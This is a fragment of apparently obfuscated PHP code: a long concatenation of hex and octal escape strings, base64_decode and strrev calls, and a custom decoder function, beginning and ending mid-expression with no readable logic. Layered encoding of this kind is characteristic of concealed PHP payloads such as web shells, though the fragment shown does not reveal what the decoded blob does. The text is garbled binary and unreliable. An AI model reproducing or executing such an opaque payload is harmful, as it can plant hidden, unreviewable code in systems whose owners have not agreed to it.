¥´ÿSm‘ñé>—ÍµäıYn]±'."\r".'')."\x4d\x35\xfa\x23\xaa\x39\x3b\xb5\xef\x79\x2f\xfa\xdf\xde\x78\xc0\xb5\xb1\x17\x36\x3c\x79\xf0\xf\xb6\x8c\x7e\xf9\xfc\x23\xe6\xfd\x77\x7d\xf6\xc1\xc1\x3b\x8e\xfc\xc1\xfa\x2f\x2f\x53\x2f\xfb\xc1\x7"."\x6f\x6c\xab\xfd\x63\xf0\xc4\xaf\xce\x31\xd5\x13\xcb\x5f\xfe\xf7\xc9\xcb\xf7\x56\x9b\xd7\xae\xf9\xf4\x8f\xe6\x29\x5f\xfd\xed\xbf\xef\x7f\xf0\xd1\xf5\x4f\xfe\x71\x61\xd3\x57\xcf\x9b\x7f\x5c\xf4\xc5"."\x7f\x3e\x78\xeb\x81\x95\x5f\xbc\xf5\xe1\x57\x5f\x7e\xbe\xd7\xca\x8b\x23\xcd\x5f\x9e\x34\xeb\x98\xe6\x3d\xcf\xfa\xd6\x5b\xcf\x2d\x38\xec\xb9\x7b\x7b\x3f\x29\xdc\xf7\xe4\x8e\x57\xbe\x58\xbc\x75\xdd"."\226\304\215\317\217\224\17\137\373\371\37\116\135\272\345\331\167\76\332\343\364\366\307\276\175\304\302\135\302\57\237\264\75\233\373\171\354\334\167\126\215\34\267\340\315\313\236\336\176".base64_decode('5m2x8tE/CeYOuvO4a9cu2u+nk9X3z7nlH7u1LPv7ihP3e/SAP2R+d8WLU+9/uHPjRQ==')."\147\155\332\365\347\276\314\276\247\166\245\354\175\16\71\353\253\75\46\115\331\167\345\346\3\231\245\323\354\271\300\1\201\224\126\313\227\215\322\40\234\333\260\304\267\130\200\333\132"."\60\213\30\31\134\155\216\226\101\130\64\213\261\121\20\100\347\171\275\120\202\2\263\33\101\305\147\366\154\10\64\316\202\217\145\307\7\355\325\114\251\74\123\32\267\162\32\134\144"."\315\235\16\131\362\303\366\100\266\10\222\267\114\332\50\150\253\41\2\112\125\263\147\316\241\201\341\42\112\33\5\116\157\326\34\320\6\234\67\23\2\63\146\316\144\125\103\311\271".base64_decode('DdDceexjmdHy2BpzHKBzoKsz54C2Un51btC0QdQxqI3nR0rAVmczI4ZWZgX5B2bAaA==')."\26\327\350\271\121\246\27\240\25\63\153\154\43\313\332\0\255\143\72\142\63\147\300\355\365\310\170\132\37\134\303\144\347\215\154\210\347\100\123\107\363\253\215\364\0\60\373\103\331".base64_decode('UUe34eDQ2AhZrMzIINeiHB7X0jmm0DVjOnxk0FlTyJeg3YMlZyQ9CnM+fTa7RS9rYw==')."\126\6\346\150\326\164\30\304\342\100\326\136\315\324\171\346\314\200\221\132\243\217\241\311\322\330\304\0\164\26\353\233\66\232\133\75\62\304\304\341\232\131\316\60\145\43\55\135\312".base64_decode('DI+sppExc3U+x8zr5s2FWqbPgCEw0BwNFaFBljlSHGa64tPnwUTNYNg8oxFmYMjO6w==')."\x8e\x1\x1d\x1d\x1d\x5e\x3d\x9e\x65\xb2\x68\x2d\x6d\x66\xca\xe3\x3\xec\x6b\x90\xbf\x94\x19\xd4\xcb\x45\x87\xa1\xe\xd4\x3b\x6b\x1e\xd4\x9b\x5e\x33\x62\x8d\x31\xbd\x84\xa1\xfc\x58\x6e\x78\x84\x19"."\145\150\343\253\13\203\14\107\164\163\170\314\141\163\70\13\352\236\67\33\172\62\132\62\106\162\253\271\356\363\152\113\143\22\327\271\63\330\27\347\0\166\217\144\13\143\306\60\164".strrev('B†,Æš˜G‡Ç–ğÃ¦óıY3mX\\l—[ÍpvVK°*	høâìfèÁfŸ•Í0¤t').strrev('Ú¯(dÁóÎPĞÒ,Î=(pt}kdÎª;²Å„yhÎÕé×a®(Z40 s')."\7\30\142\101\73\346\314\154\144\155\200\121\232\71\13\60\161\46\133\301\303\305\114\276\314\4\325\263\347\101\175\103\205\301\154\171\34\32\222\53\257\266\322\14\325\6\62\351\202"."\xce\x34\x74\x57\xf\xe6\xcb\xe3\x5\x68\x59\x23\x9b\xef\xb1\xe1\xf1\x32\x17\xd\x3a\xd6\xd0\x58\xa9\x90\x67\xb3\xc5\x7e\xa1\x19\x73\x59\x60\xb0\x68\xc\xaf\x2e\x5b\x6c\xa2\x18\x95\x9b\x5\x3d\xc9"."\217\72\332\300\20\350\247\317\142\163\156\216\146\13\226\1\230\316\225\106\133\264\364\60\223\353\312\232\227\334\230\254\20\310\153\5\256\360\322\1\332\31\151\331\272\100\316\60\254"."\xeb\x4c\x45\x1b\x6\xd8\x11\x1a\x15\xa0\xe9\x9\x70\x23\xaf\xb\xb9\x34\xbd\x9\x60\x25\xc5\xa1\x1b\x8b\x3f\x24\x9d\xc\x1c\x4d\xca\xb5\xa4\xb\x8e\x94\x8c\x62\xae\xd4\xa4\x63\x5a\x5c\xb\x84\xea"."\x97\x5\x70\xb\x3\x72\x57\x57\xe4\x19\x99\xa8\x72\xa5\x8\xb2\x58\xdb\x1e\x31\x2d\x18\xb2\x61\x33\x93\xce\x99\xa5\x8c\xab\xd6\xcc\x80\xab\x4e\xe\x65\x52\x2\x6f\xca\xe0\x4\x70\x54\x8f\x4b\x49"."\x9a\xc1\x5c\x83\x35\x40\x26\x4d\x95\x23\x1\x36\xdc\x3\xd2\x84\x52\x61\xb9\xa3\xd9\xc3\x1\x19\xec\x97\x53\x8d\x2\x6a\x45\x2e\x17\x70\xdb\xc2\xaa\xe4\xf\x8c\x1\xb5\xb7\xb4\xb1\x66\x71\x41\x5c"."\x40\xdb\xc3\xd2\xc0\x63\x23\xd6\x9e\x6e\x35\x15\x4a\x2e\x91\x94\xf0\xb0\x91\x25\x43\x27\x55\x28\xc4\x4b\xdd\x12\x35\x48\xe3\x28\xcf\xa0\x7b\x8\x18\x86\xbc\x7e\xf3\x96\x6d\xe7\x5c\xb4\xfd\xc2\x5b".base64_decode('tm+6ads9579+0y3b7rsQRV+76+xtN/3ijUs2vHbXptfuOun10ze/d+9Z2865+fVT7w==')."\xdb\x76\xe9\x35\xdb\xae\x3a\xfd\xb5\x2d\xf7\xbd\xfe\xc0\xe9\x3b\xae\x39\xf3\xb5\xbb\x6e\xdc\x7e\xe9\xf\xb7\x6d\xb8\xe3\xb5\x2d\x17\x6d\x3b\xe3\xf2\x6d\xa7\x9f\xb3\xfd\xfc\x4d\xaf\xdd\x77\x29\xca".base64_decode('v/0MUTPKtu3Gi3HZe0/Zdtddr//yGp763r0n08aMAx1t1x1sm8o0q8joKAsVQEjdDg==').strrev('RŒ£|ô¦R8ÜØVNŒV×îÔpŠ~0[úXê!Å-Õ“–±¡¬B°9İ(').base64_decode('2ga6NO8l/Ks2zDShClrhsRZzVYeDcL2GJXrKoIYAmSZlEBVTmP2O4pgsnB/jk+5ZBA==').strrev(''."\0".'Ü…>)´)ğÑ,'."\0".'‘îIÈ˜››Ö¸$›•VE(&w ©2L4/y¬íMƒ7•§U')."\53\156\103\130\174\267\317\356\313\345\65\46\67\337\322\213\71\116\342\261\114\263\352\40\312\255\221\257\237\75\135\113\126\31\106\336\71\127\42\132\327\45\247\112\106\171\264\145\1".base64_decode('sGGGc4jQiVtKcjsvukGjQvCMPsTppKVnDKY+rOdJTqCPAenah1rPcB3mNFoOlusGaw==')."\xc1\xa2\x62\xb6\x88\x1d\x1e\x38\xf3\x17\x81\xe9\x32\xb3\x81\x92\xda\x0\x61\x61\xd\x24\x43\x73\xde\x5b\x31\xbe\x78\x5a\x5b\x24\xc3\x7e\x9c\xad\xc9\xef\xf7\x4b\x2\x5c\xa1\x42\x86\x43\x50\x9d\xb8".strrev('q36K`û °b2AAÌ'."\n".'ÌqdˆĞ7:‚šeBk4íºCCòZŞ¹[ÁÙ^°F').base64_decode('mRKYCfu3PR+UPuYTutIsNR/golSpkGNQFERZEqUCnu0md5/1QkYqNF9LO1Kt6iAMag==')."\100\214\207\66\115\244\353\31\260\363\12\112\243\64\62\215\61\46\364\267\323\215\3\250\377\176\216\26\150\172\21\353\220\261\211\352\51\354\76\120\245\55\331\142\47\4\106\341\342"."\144\270\276\246\250\43\117\171\21\261\47\5\256\163\152\347\64\166\333\150\143\23\216\202\316\361\257\144\13\305\173\356\33\203\306\261\276\266\212\366\171\133\340\256\232\61\40\163\54"."\xda\xa2\xb6\x46\x13\x7c\x9d\x39\xcc\x6\x37\xd4\x1d\x55\x93\xc9\xb8\xe4\x2e\x83\x18\x74\x2e\x57\x97\xc4\x5b\xd5\x70\x3c\xbe\x24\xa\xf8\x7\x23\xde\x24\x91\x4b\x6c\xb\x27\xae\x91\x71\x4c\xd8\xc4"."\xe1\x3b\x19\x59\x89\x4c\xe6\x47\xb0\x5b\x2\xbc\xe7\x26\x15\x50\xb6\x44\x88\x1e\xee\x8\x25\xb8\x72\xfb\xac\x40\x43\xa0\x51\xe4\x45\x1f\x54\xb1\x8e\x7f\x33\x33\x81\x4e\xa6\x42\x89\x2a\xce\x29\xa8"."\323\12\230\15\160\124\1\5\72\342\313\224\160\74\326\323\331\225\244\76\31\50\274\53\56\245\23\25\146\110\146\256\53\52\223\241\372\110\167\54\24\216\50\321\256\124\234\331\50"."\x70\x5d\x52\x62\x9d\x92\xe4\x71\x36\x4\x96\xad\x73\xd7\x14\x50\x9e\x46\x64\xb\x1a\xb9\x46\x5e\x13\xe0\x6f\xaf\xaf\xb6\xaf\xa6\x6f\x6a\x5f\x5d\x5f\xfd\xaa\x40\x9f\xdd\x1f\x14\x54\x5d\xd0\x78\x32".base64_decode('P4Y8WRDpboXONvFQxoZ13JlMHg+GdfFEKBxjDWsJJSEYD0dpYMcFt752z9k7fnbTtg==').base64_decode('H25CFW3/6Snbf3IH4l4wx3LTWTvuP3v7BTdvPws4DeX1m+987b4HdlxwzbabLt5+0Q==')."\335\73\176\172\32\115\170\343\332\133\267\375\350\32\336\60\345\215\363\357\337\176\366\325\234\213\241\314\213\17\225\176\143\303\246\35\367\335\204\171\230\53\117\332\176\373\231\333\57"."\335\264\355\107\277\334\166\311\65\73\316\276\171\333\25\247\156\333\270\351\365\233\57\74\312\213\126\64\336\313\46\6\254\164\203\53\261\121\62\35\354\76\173\32\36\350\172\364\133"."\207\15\40\320\57\323\343\46\32\276\307\367\104\272\302\21\257\101\221\34\5\57\37\123\51\276\120\5\27\140\70\155\360\22\302\342\304\131\100\163\355\204\255\130\7\330\40\65\112"."\152\114\153\44\31\116\104\133\42\240\142\317\47\152\12\141\271\100\357\1\101\223\211\245\74\314\155\43\53\274\262\50\165\14\265\353\25\127\107\264\100\332\314\225\362\5\322\130\245".strrev('õÎ^o}©E¨àĞ¶\\zÆ¾'."\r".'}j+µºŠ r»±F€"­¼”›¬DVğøÕ^k')."\x11\xdf\x80\x2b\xd6\xe8\x6b\xa8\x57\x6a\x8a\xc3\x35\xd0\x2e\x31\xae\xa8\xf5\x2a\xcd\x69\x2b\x9a\xaf\xe\x1a\x2c\x37\x57\xe4\x45\x84\xd4\x76\x2c\xcd\x28\x38\xb6\x92\xf6\x71\x10\x2f\x8f\x7e\x5d\xce"."\127\322\1\121\202\316\23\312\341\205\51\241\256\126\167\116\352\263\245\273\226\350\111\246\3\16\367\11\301\246\271\266\136\31\0\303\205\52\211\244\230\153\60\232\135\203\121\67\15"."\xa8\x46\x77\x3b\x9f\x6f\x6a\x95\xa0\x50\xa3\x35\xda\x2c\xcd\x66\x13\x5\x50\x32\x55\x18\x4a\x67\x8b\xe5\x35\x51\x37\xd0\xe4\xd0\xfc\x28\xc0\x53\xb0\xfe\x3e\xaf\x9\x11\x27\x9e\xc0\x66\x10\xc3\xf9"."\x24\x56\x49\x23\xce\x74\x6a\x28\x5b\x48\xfb\x99\xb7\x87\x18\xe1\x3\xa3\xeb\xce\x15\xbc\xf\xc\x97\x15\xc6\x93\x70\x57\x3c\xd8\xfc\x2e\x92\xa\x77\x50\x2c\x4f\x4a\x68\x9e\x19\x98\xe2\x42\x54\x31"."\x9c\x8a\xb\x45\xf8\xd9\x2\xf2\xd1\xe5\x82\x9\xc2\x24\x92\x2f\xda\xd5\x16\x4f\x74\x52\xb3\xb3\x64\xb8\x23\xd2\x19\xa\x0\x49\xa7\x98\x40\xf3\x63\x86\x4b\x69\x56\x6a\x31\xe5\xa3\xa0\x5a\xd7\xf0"."\223\17\261\41\113\221\257\242\165\245\72\210\173\242\243\120\34\202\306\300\354\53\304\172\134\43\105\232\153\251\373\13\250\222\373\214\212\47\122\52\32\0\40\317\22\325\255\225\366".strrev('XWß'."\0".'v(‰­L®˜Ì]ÈáZì,Ê-«¼pÎ¸åP¥®`‘úó&C±`¡Ù•O[©I')."\x55\x92\x5d\x23\x8a\x8\x2d\xb\x14\x29\x8e\x64\x78\x58\x98\xc4\xe3\x4\xce\x1\xa0\x88\x60\x0\x50\x84\x6f\x36\x38\x97\xe4\x3\xb\x7f\x3f\xd9\xc5\xc3\x82\xe3\x45\x91\x9e\x24\xb3\xaf\xc0\xd4\x77".base64_decode('WSsPd3ADaJwQT0iRUCLUmeTRxDJur8Fh1G5D7erpFBQ/FlqKkCUu2BVGresCUxfV9w==').strrev(''."\n".'½( 8Œ…"¹¾\'vñcS¯ârÆÉÁîC××³)ôm¯õY‹?¤8#Q')."\342\177\123\202\377\265\331\326\305\127\203\202\160\130\241\226\265\112\127\174\131\110\270\173\222\22\0\42\274\77\5\127\366\366\215\364\5\20\353\140\257\22\106\155\255\55\12\143\112"."\xc2\xe4\x80\x4f\xe5\x0\x50\x3a\xc4\xb6\xd1\x55\x3e\xd8\x31\xd4\x9c\x39\xc4\xd9\xc6\xae\x56\xc6\x2e\xd0\xdf\xe5\x2c\x40\x68\x25\x14\x40\xa7\xde\x62\x8e\x59\xb7\x51\xb3\x3a\xb5\x6f\x5d\xdf\xb1\x7d"."\376\0\265\44\304\254\114\237\117\64\111\215\54\107\173\154\62\351\62\203\124\211\107\43\250\35\365\22\102\164\325\322\310\2\370\201\43\330\2\140\126\41\272\260\231\117\146\344\370".strrev('²·—hºÌ‹ıµÚ ]ÈlÔ>z„ˆÿÃ¬‰.‹% 3Á—M'."\n".'XŸ¡ı]j{oè]u')."\226\110\152\131\44\102\63\260\60\374\212\254\210\340\100\127\45\337\155\130\207\37\222\205\116\77\124\255\252\165\144\60\375\375\323\352\125\65\150\367\0\276\160\137\21\165\265\307\64"."\xd6\xc2\x1e\x12\x4a\x86\x5\xf5\x75\x21\x44\x25\x2e\x10\x8d\x7b\x37\x22\x70\x8f\x64\x10\x6f\x4f\xc4\x7b\xba\xa5\x78\x47\x68\x69\xb4\xab\x9d\xc5\x82\x53\x59\x68\x2a\x54\xad\xb4\x46\x93\x68\x88\xc2"."\xc\x19\x85\xa3\x34\x39\xe\xc\x27\x61\x8b\x64\x1e\xd8\x85\xd2\xad\x88\xb2\xa3\x88\xc4\xc0\xe3\xa3\x1\xa5\xcc\xee\x55\xd6\xd2\x13\x8d\xb5\xca\x96\xdf\x38\x23\x6c\x28\x84\xaa\xc3\x9e\x32\x85\x35"."\216\305\211\15\70\213\340\41\147\141\202\156\54\102\306\200\105\350\0\260\30\31\56\26\41\16\331\130\204\164\224\105\360\131\45\322\305\322\320\121\21\35\363\330\371\57\253\225\271"."\351\342\374\314\200\344\110\2\323\340\0\25\235\141\167\42\350\154\251\161\1\247\107\72\112\4\125\322\371\237\152\344\51\222\5\165\220\202\20\267\111\200\350\267\157\325\42\302\15"."\257\142\210\111\315\164\235\224\341\344\134\137\1\243\76\364\225\50\261\241\224\276\303\254\36\210\130\120\65\45\321\64\331\250\145\200\20\104\121\71\66\310\174\205\74\7\153\42\22"."\x69\x30\x8d\xba\xf\x54\x9c\x2e\xad\xe2\xe7\x24\xf0\xe1\xe8\x83\x5f\x68\xd1\x3e\xf4\xa7\xf\xa2\x4c\x76\x1\x96\x2c\xb5\x3e\xd8\x64\x99\xf5\x83\xdb\x99\x64\x5f\x5f\xcd\x44\xa3\x5\x19\xd8\x98\x41"."\264\206\106\131\51\203\357\171\351\54\166\110\242\72\171\46\7\47\207\63\41\161\246\122\153\21\157\115\304\273\51\7\242\104\333\24\352\14\101\251\245\162\356\132\140\255\302\211\10"."\136\35\64\27\113\253\253\165\111\245\26\326\52\140\31\135\357\56\25\355\152\215\54\127\152\215\314\250\252\151\52\24\126\320\132\144\25\51\25\65\261\32\150\133\341\366\306\316\232".base64_decode('I4qMXuz0HKawlEC5CtaMuDVgVqg+OKLzFMoR06RoEm3YsRjpKUoybMzI+hTufQAD8Q==').base64_decode('4YNKPqEilkArokmR5alECAMJ9zl5EvpDCAo+HVl5jRpoEp4tsApEBqtcLCJlHjGTCA==')."\30\104\266\74\251\117\74\205\310\15\350\60\313\122\205\45\300\165\323\130\167\42\332\31\112\254\200\41\23\147\0\130\201\146\316\145\240\53\42\206\335\43\231\210\167\241\126\313\46".base64_decode('43SOOYVF51lGYVFrYAHgmQeGh/rPVLkFMBOp1DF7Wh8LME8MxEaJCazyiOTwmJg1wA==')."\175\230\25\71\125\266\262\22\16\76\361\46\211\47\231\121\373\266\120\117\114\206\300\120\51\113\42\53\276\146\215\260\226\126\133\43\54\215\11\147\370\152\203\376\324\315\202\376\121".base64_decode('5xB109GZtFTA3k+4e0FoFeytPam4ivaPRARTc+gRH1apvdK5W54UqAZn4N5Sv6ZrLA==')."\117\265\256\361\362\134\16\25\351\152\217\166\105\232\73\307\242\311\120\247\302\32\16\222\66\354\124\160\56\324\23\215\253\61\304\23\253\262\60\55\32\7\131\257\313\105\235\252\12"."\x7\x23\x1\x4d\x68\x67\x3b\x56\x49\xf2\x5e\x66\x98\x44\x13\xba\x93\x1b\x4d\x10\xd5\x6d\x84\x10\x21\xe1\x58\x80\xcb\xa3\x49\x5a\x69\x0\x97\x96\xb7\x2b\x28\xef\x71\xc\x69\x98\x4d\x38\x5\x67\xa6"."\134\312\174\221\135\165\175\334\253\355\54\203\205\126\266\270\316\145\327\307\334\351\31\24\350\221\34\3\340\302\12\373\40\271\320\51\270\233\207\366\313\34\363\150\244\352\242\67\171"."\xdd\xb6\xf9\xb5\x2e\x39\xfc\xb0\xa0\x93\x15\x7e\x11\x64\xbf\x9c\xad\x2d\x6c\xe4\x4a\x5\x27\xa9\xe7\x40\xb8\xde\x3a\x40\x74\xda\x85\xc1\x99\x30\xea\x91\x74\xdd\xc9\x1d\x89\x98\xe\xea\x22\xcd\x53"."\x10\x6a\x8a\xf2\xfe\x4a\xb9\x4\x30\x26\x1c\x71\xe2\x2b\x9\x51\x67\x3f\x3b\xc2\x8b\x4e\x8e\x1b\x6c\x67\xf3\x5e\xee\xf1\x46\x16\xcc\x6e\xdd\xca\x1b\xe4\x1e\x66\x99\xb8\x66\xe1\xe9\xba\x8c\x0\xd5"."\6\330\337\50\175\101\262\32\304\121\230\110\174\321\50\31\146\224\12\250\135\176\331\324\7\115\54\1\112\306\5\314\57\34\215\315\1\345\27\204\74\20\30\2\10\373\265\130\112"."\100\370\175\41\165\142\336\305\57\374\60\144\64\331\222\122\162\216\175\224\74\343\144\352\4\342\15\32\262\123\206\200\360\111\312\161\171\61\37\160\254\157\6\267\343\230\17\36\124"."\245\266\164\363\374\151\356\174\232\216\206\64\314\4\100\203\144\365\51\115\242\21\35\250\245\246\65\46\341\200\4\355\144\256\212\300\43\152\314\34\342\204\3\261\207\340\244\312\105".strrev('»,F*2[B`şoœ²"Ğ‘Âåª÷¬°§$z…Íö:õ ¼a†Àü5©±Ğ(q¢<')."\276\261\220\240\177\344\113\244\220\104\63\75\145\10\72\122\53\24\230\371\54\44\13\34\103\204\272\53\256\166\240\275\40\316\70\6\303\116\271\150\57\53\5\244\200\134\365\4\211"."\x69\x2c\x9c\xc7\xe6\x93\xdb\x7c\x7a\x8f\x8\x93\xbd\x16\x91\x55\x1e\x62\x5a\x14\xe0\xf9\x4a\xec\xd4\x21\xfa\xb3\x22\x9f\xf1\xa3\x86\x3\xd6\x65\x74\x87\x7b\x1c\xc2\xd4\x8c\x99\x11\xe2\x36\x4b\x96".base64_decode('xXlO/UYkH5ZaWceGXEzaUaHMAl2p7Bw0Ed9RJeM9CXaRguNYZKQmIuEV/BaDQ9tCSw==').base64_decode('vZAoFvmF2quCuSAKw8mJT03EscQuEmvzFEh2cJ+jbpgai3YtqZqA+IZOqQgFRlORTg==')."\57\314\135\103\62\22\112\60\177\266\70\336\22\213\207\245\344\150\274\162\44\70\143\302\201\124\336\107\201\301\225\165\175\153\311\221\245\11\235\134\62\353\260\140\300\257\366\117\253"."\x5f\xd4\xb7\xbe\xbe\xae\x2f\xb8\x28\x30\x95\xcb\xb3\x28\xb9\x92\x8c\x55\x27\x0\xdb\x6c\x13\x69\xf2\x2\xf0\xfe\xc3\x80\xb4\x18\xc4\x82\x81\x0\x7c\x84\x7\x82\x7d\x41\xe6\xd6\x2a\x28\x12\xe1\x57".strrev('me™Š…Ì7$Ÿ$ŠäÕHïJ>šìƒj¤ŒTæeJÌ×€õ‹0i<z®@çRN‘ø›çä').base64_decode('BU9m9LdbzooVZKpmdOGyyzpYBgUMUywTsZ4zZrqE3RGJyRG2xAgUcFWBKPmwOHzDcg==')."\x4c\xb2\x65\x5b\x40\x9b\x24\xec\xc2\x61\xc4\x4b\xb6\x77\x44\x8f\x5b\x12\xeb\xec\x8a\x77\x1f\x9f\x48\xa6\x7a\x96\x2e\x5b\xbe\x2\x7c\x32\x36\x31\x6c\x19\x54\xfc\xcc\x9b\x18\x78\x1a\xd\x96\x35\x2b"."\130\146\76\304\227\342\243\200\156\7\145\26\213\3\121\37\261\23\127\346\41\214\112\10\170\52\46\33\301\352\111\264\266\140\276\340\64\116\220\243\333\322\7\114\323\231\40\165\151"."\347\327\127\14\211\275\175\166\77\107\317\214\136\206\240\320\110\263\305\1\10\270\13\277\354\313\34\143\253\314\360\145\6\74\154\0\0\304\243\23\22\263\40\200\334\215\57\215\216"."\261\113\20\342\302\113\162\203\13\16\64\333\261\3\115\346\74\163\15\161\353\350\365\11\271\306\257\15\273\322\205\43\334\65\176\164\100\164\305\75\176\41\261\16\2\367\206\213\43"."\66\217\311\113\201\154\24\134\251\6\157\107\35\236\205\310\201\302\350\221\250\36\66\51\63\301\345\167\33\142\214\63\112\57\345\165\101\114\216\371\53\342\265\232\106\175\212\160\20"."\314\4\234\156\317\277\154\55\20\37\62\202\201\116\313\216\5\30\111\315\17\13\355\255\374\60\327\254\110\273\130\12\274\173\213\230\45\161\15\340\252\37\245\265\214\61\115\51\260"."\xba\x6c\x19\x4b\x48\xef\xa0\xb8\x9c\x3a\xc8\x8f\x1b\x68\xc5\x62\x38\x8b\xfb\xe0\x5a\xa0\x2e\x50\x5a\x8e\x30\x2\x39\x88\xf5\x42\x64\xfd\x12\x90\xe1\x51\x55\xd3\x0\x4a\x6e\xa5\x2c\x5c\x86\xe7\xb7"."\x45\x88\x4f\xe0\xa0\x34\xb5\xae\xea\x32\x8c\x5c\xdb\x6c\x3d\xe4\x34\xdb\x59\xea\xf2\x7d\xf3\x8d\x2e\x84\xb1\x57\x87\x4e\xce\xa6\x72\xe\x29\x68\xda\x76\x10\x7b\xdf\x23\x7c\x21\xd7\x9f\x8a\x27\xd9"."\355\204\273\57\364\265\31\351\30\11\156\300\270\373\133\356\34\127\170\320\245\102\145\32\216\160\317\45\210\275\15\15\141\147\25\146\201\275\130\21\31\55\232\266\56\373\146\316\350".base64_decode('xBskt9uWvBvntVG8WJiKmeTnGDFMQ3wUiSNX2SkfHjp/3uXOftSPBsHjPdjW9WGmEg==')."\47\61\275\374\140\333\315\275\2\173\73\206\221\130\254\140\213\273\204\246\67\223\376\252\0\277\244\22\107\361\130\362\252\216\33\7\107\336\54\31\33\166\26\246\77\47\124\353\253".base64_decode('3xLOmdFc0kcSluhjzPGxh6x4fCX3tfd19qXkwXEsbXAQNVZyzulqi3DNDOhH3jVgQw==').strrev('wğ#¼ÆG£zIb½'."\n".'ö†<{¸*”ä‚çßh6Ş$4/Õ[»gc±0')."\125\360\231\230\72\321\146\204\236\270\271\206\227\6\232\131\217\320\320\25\132\314\14\154\236\153\153\20\46\326\64\325\34\123\207\176\353\153\174\65\230\355\41\161\214\213\30\100\332"._kodDe('LcRCPWX6DnTFgswhYoEIge2sewFPHdQ0M04cHUGUE8hy5e/l0fnRdMFcNgjhZLZPEoA=').base64_decode('0KOqlh9ngndV9noM/pRh1OWUDt4S5g+5sxWqX+4PdZ7gF56BFywazecUOM801zYGGg==').base64_decode('ahX2nExzbU+qzT+3dtHCyQvC5LrS0TvxfSM+bdNj5kK4TliAFxWPBN2xicoC/uW1cQ==')."\263\240\215\330\210\102\345\3\151\30\314\36\116\305\204\127\356\202\356\214\230\26\334\305\2\173\66\275\141\246\214\323\200\42\66\133\320\104\264\321\204\45\160\254\373\75\305\261\122".base64_decode('wY8Pu/6k7EnO8wBCgzs/Pq6688ukMS2IRl4E6XsXTYr8CIrkCpeIQuiqZGoFAMNUkw==')."\201\4\5\35\24\32\342\230\20\252\156\102\270\330\323\136\74\324\176\304\27\140\374\107\213\312\61\44\77\326\162\26\367\63\32\336\307\65\274\243\100\212\340\311\365\313\17\173\214"."\x22\xe6\xd\x27\x63\xaf\xf5\x7e\x3c\xbf\x7e\x23\x33\x51\x8a\x58\xd4\x55\x9b\x9a\x6\x54\xa9\x96\xa5\xa7\x64\x64\xbc\x9f\x24\xd7\xdf\xfe\x52\x89\x7d\xb0\x6a\xa5\x32\x6b\xc9\x32\x90\x4e\x44\x79\x7d"."\262\73\164\174\364\366\163\151\277\327\333\272\140\307\265\112\327\360\150\361\52\323\147\64\315\232\327\304\154\23\217\145\267\367\245\42\123\314\105\101\346\72\376\250\340\40\243\3\342"."\x5d\xd\xd6\x37\x3c\xe1\x92\x93\x7d\x17\x58\xc\x23\x5f\xe1\x8c\x80\xb8\xf2\x89\xd6\xba\x1e\x75\x81\x8e\xd2\xd3\xa0\xf4\x18\x0\x91\xd1\xd2\x95\x84\x75\x5a\x54\x6e\xf7\x57\x85\x92\x22\xbe\x9e\x6d".base64_decode('GLDZSo/A8QkZYgGL59fEEhnIDYueDGAdZMDwYdRQU7BXZKOVBaDZUmG4WUpUHNNU8g==')."\x5a\x61\xc\xb8\xd7\x29\x76\xd3\x14\x7b\x3e\xfe\x50\x33\xd6\xbe\xb6\xa7\xb0\x57\x2e\x84\x3b\x55\xbc\x8f\x8\x47\x79\xd4\xe5\xb\xa4\x50\x89\x74\x0\xbf\xf4\x12\xc0\x9b\x54\xa2\x24\xbd\x81\xa5\xa2"."\335\310\163\21\52\77\344\327\115\236\20\201\175\213\76\47\2\11\261\236\366\150\227\244\235\43\1\324\160\153\227\32\352\356\256\232\300\71\31\54\255\302\127\333\201\325\114\342\237"."\146\210\267\300\310\17\51\151\254\361\337\134\203\241\65\212\155\245\231\337\331\232\40\220\132\222\101\210\117\27\30\120\244\26\27\121\6\121\237\374\44\104\223\153\27\56\10\32\13"."\xf9\x7c\x8\x1f\x3c\x96\x29\xc\x1a\x2\xc1\xa3\xf1\x1\x21\x88\xf5\x5f\xa\xc7\x62\x4\x90\xaf\xe3\x9\xb4\x4d\x78\xdc\x51\x94\x5\x9a\x42\x87\xba\xb9\x96\x8\x65\x6b\x95\x2c\xda\xb2\xb9\xf2\xdf"."\x42\x6f\xe1\x2e\x76\x27\xb2\x20\xa8\xc9\x89\x78\xf1\x25\x4c\xc6\x21\xf3\x73\x41\x99\xfb\x94\xab\x2a\x57\xf\x49\xfe\xa9\xc9\x43\x14\x61\xad\xb0\xb4\xb2\x8\xae\x3c\x90\x96\x93\x7a\xa9\x11\x47\xbf"."\74\257\304\0\243\262\164\220\234\102\203\342\100\244\322\327\320\252\337\112\160\41\176\25\214\301\327\341\150\115\260\173\110\55\75\214\261\122\154\41\320\14\110\350\306\307\33\232\340".base64_decode('cszvSAoKJWyfRETClngeZ+1aWhHmGtavr4SBjqM3KVQ0vCCMWl4YPmYKGNoL3Z+haA==').strrev('zÎà/¼i¹à+Ö˜4Á úıu06·¯¬I‰ÔËØ•Ïk¡v®±2Šş‡–g-')."\x43\xcf\x33\x2\xc0\x9b\x93\xf2\xa0\xc7\xc1\xea\x9c\x1c\x9c\x2a\x6c\xaa\xb8\xc6\x8f\x82\xd5\x80\x9a\x9b\x17\xf6\xf2\xb\x8f\x7e\x96\xc6\x18\x49\xa3\x71\x2e\x43\x81\xf1\xac\x3f\xb5\x8c\x7\xc3\x5d"."\x82\x55\xe6\xab\x80\x12\x9c\x0\x91\xa\x84\xdc\xe\x6e\x17\x89\x67\x82\x64\xbb\x6\x1a\xe\x15\x8b\x72\x34\xc8\x22\x58\x1a\x9e\x33\x6\x82\x9c\x1c\x50\x9\x79\x20\x2d\x4c\x91\x58\x16\x42\x8c\x3c"."\x70\xac\xae\xe3\x49\xc0\x8f\x8c\x12\x70\x19\x11\x54\xc4\xb9\xad\xf6\xc2\x51\x5d\x1c\xc8\x3\xb\xec\xb4\x65\x14\x1d\x17\x21\xa3\xef\x41\xd6\x90\x97\x69\x56\x6b\x65\x8d\x66\xa9\x51\xe0\x6c\xdf\x5c"."\x43\xfc\xb6\xd7\x20\xc2\x45\x53\x80\x62\x88\xa6\x2c\xc0\x14\x4a\xb1\xf4\x5c\x73\xd\x69\xae\x9d\xd5\x75\x54\x9e\xd0\xa0\x6a\x1f\x41\x5\x6b\x14\x46\x3e\xf3\x1a\x1f\x31\xcb\x31\xd1\xe6\xc9\xcd\x5b"."\xe0\x9d\xac\x9e\x4\x18\x2\x84\xba\xe0\x6\xe2\xe8\x95\xf4\xf7\x98\xa3\xf9\x4e\x81\x1f\x74\xcb\xe9\x16\x55\x73\x26\xf4\x88\xdc\x7d\xd\x62\x99\xd\xcd\x4\xef\x75\x75\x27\xe2\xa9\x78\x98\x3d\xea"."\xe3\x16\xee\x50\xd8\x4c\xc6\xfc\xda\xd4\x7